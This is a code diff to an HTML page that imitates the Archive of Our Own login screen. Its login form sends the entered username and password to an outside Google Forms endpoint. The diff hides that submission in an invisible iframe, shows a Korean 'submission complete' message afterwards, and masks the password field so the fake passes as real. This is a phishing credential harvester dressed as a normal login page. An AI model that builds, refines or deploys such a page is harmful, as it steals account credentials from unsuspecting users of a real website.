@@ -115,40 +115,44 @@
  If you already have an Archive of Our Own account, log in now.
  If you don't have an account, you can <a href=https://archiveofourown.org/invite_requests>request an invitation to join</a>.
  </p>
-<div id=loginform>
+<div id="loginform">
+  <script type="text/javascript">
+    var submitted = false;
+    function handleResponse() {
+      if (submitted) {
+        // 제출 완료 후 표시할 내용
+        document.getElementById('loginform').innerHTML = 
+          '<div style="text-align:center; padding:20px;">' +
+          '<h3 class="heading">제출 완료!</h3>' +
+          '<p>설문 응답이 성공적으로 기록되었습니다.</p>' +
+          '<button onclick="location.reload();" class="button">돌아가기</button>' +
+          '</div>';
+      }
+    }
+  </script>
 
-<form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSeqjPSV2HLo_By2Cr82yJgjjMmA2NYSIZJDY9G3Zzj6vg1MXQ/formResponse" method="POST"" method="POST">
+  <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" onload="handleResponse();"></iframe>
 
-  <dl>
+  <form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSeqjPSV2HLo_By2Cr82yJgjjMmA2NYSIZJDY9G3Zzj6vg1MXQ/formResponse" 
+        method="POST" 
+        target="hidden_iframe" 
+        onsubmit="submitted=true;">
 
-    <dt><label>Username:</label></dt>
+    <dl>
+      <dt><label>Username:</label></dt>
+      <dd><input type="text" name="entry.996873737" required></dd>
 
-    <dd><input type="text" name="entry.996873737" required></dd>
+      <dt><label>Password:</label></dt>
+      <dd><input type="password" name="entry.1007897845" required></dd> <dt><label for="user_remember_me">Remember me</label></dt>
+      <dd>
+        <input type="checkbox" value="Yes" name="remember_me" id="user_remember_me">
+      </dd>
 
-
-
-    <dt><label>Password:</label></dt>
-
-    <dd><input type="text" name="entry.1007897845" required></dd>
-
-<dt><label for="user_remember_me">Remember me</label></dt>
-
-    <dd>
-
-      <input type="checkbox" value="Yes" name="remember_me" id="user_remember_me">
-
-    </dd>
-
-    <dd style="margin-top: 10px;">
-
-      <input type="submit" value="Log in">
-
-    </dd>
-
-  </dl>
-
-</form>
-
+      <dd style="margin-top: 10px;">
+        <input type="submit" value="Log in" class="button">
+      </dd>
+    </dl>
+  </form>
 </div>
 <p>
  Forgot your password or username? <a href=https://archiveofourown.org/users/password/new>Reset your password</a>.
